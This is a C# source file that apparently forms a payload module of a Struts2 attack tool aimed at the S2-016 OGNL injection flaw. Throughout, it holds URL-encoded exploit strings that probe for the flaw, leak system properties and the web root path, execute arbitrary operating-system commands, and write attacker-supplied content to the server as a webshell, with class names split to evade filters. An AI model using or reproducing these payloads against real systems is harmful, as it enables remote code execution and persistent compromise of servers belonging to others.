using System;
using System.Collections.Generic;
using System.Text;

namespace payload
{
    public class S2016 : BasePayload
    {
        private String Exp_Check = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22struts2_security_%22),%23resp.getWriter().print(%22check%22),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
        private String Exp_VerInfo = "redirect:${%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22[vername]:%22),%23resp.getWriter().print(@java.lang.System@getProperty(%22[vername]%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}";

        private String Exp_Path="redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
        private String Exp_Exec = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27[cmd]%27.toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
        private String Exp_Upload = "redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22oko%22),%23res.getWriter().print(%22kok/%22),%23res.getWriter().print(%23req.getContextPath()),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter([path])).append(%23req.getParameter(%22shell%22)).close()}&shell=[filecontent]";
        public String Get_Exp_Check()
        {
            return this.Exp_Check;
        }
        public String Get_Exp_VerInfo(String vername)
        {
            return this.Exp_VerInfo.Replace("[vername]", vername); ;
        }
        public String Get_Exp_Path() {
            return this.Exp_Path;
        }
        public String Get_Exp_Exec(String cmd)
        {
            return this.Exp_Exec.Replace("[cmd]",cmd);
        }
        public String Get_Exp_Upload(String path,String fileName,String fileContent)
        {
            if ("".Equals(path))
            {
                path = "%23req.getRealPath(%22/"+ fileName + "%22)";
                this.Exp_Upload=this.Exp_Upload.Replace("[path]", path);
            }
            else {
                this.Exp_Upload = this.Exp_Upload.Replace("[path]", "%22"+path+ "%22");
            }
            return this.Exp_Upload.Replace("[filecontent]", fileContent);
        }
    }
}
